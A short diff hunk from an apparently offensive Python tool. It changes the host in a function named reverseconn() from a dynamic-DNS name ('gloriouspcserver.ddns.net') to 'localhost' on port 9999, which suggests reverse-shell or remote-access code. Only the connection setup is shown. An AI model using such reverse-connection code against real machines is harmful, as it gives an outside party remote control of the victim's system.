@@ -74,7 +74,7 @@ def enc(txt):
 
 def reverseconn():
 
-    host=socket.gethostbyname("gloriouspcserver.ddns.net") 
+    host=socket.gethostbyname("localhost") 
 
     port=9999
 
